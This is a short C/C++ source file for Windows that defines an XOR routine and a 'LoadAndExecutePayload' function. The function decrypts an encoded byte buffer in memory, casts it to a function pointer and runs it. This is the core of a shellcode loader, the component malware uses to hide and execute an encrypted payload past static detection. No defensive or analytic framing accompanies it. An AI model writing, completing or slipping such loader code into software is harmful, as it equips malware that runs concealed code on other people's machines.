#include "AdvancedEncryption.h"
#include "Base64Utils.h" // Include this to use Base64Decode
#include <windows.h>
#include <stdio.h>
#include <string>
#include <vector>

// Simple XOR encryption function
void XOREncrypt(unsigned char* data, unsigned long long dataLen, const unsigned char* key, unsigned long long keyLen) {
    for (unsigned long long i = 0; i < dataLen; i++) {
        data[i] ^= key[i % keyLen];  // XOR each byte with the corresponding key byte
    }
}

// Load the payload by decrypting and executing it
void LoadAndExecutePayload(unsigned char* payload, size_t payload_len, const unsigned char* key, size_t key_len) {
    // XOR Decrypt the payload
    XOREncrypt(payload, payload_len, key, key_len);

    // Cast the decrypted payload to a function and execute it
    void (*func)() = (void (*)())payload;
    func();
}
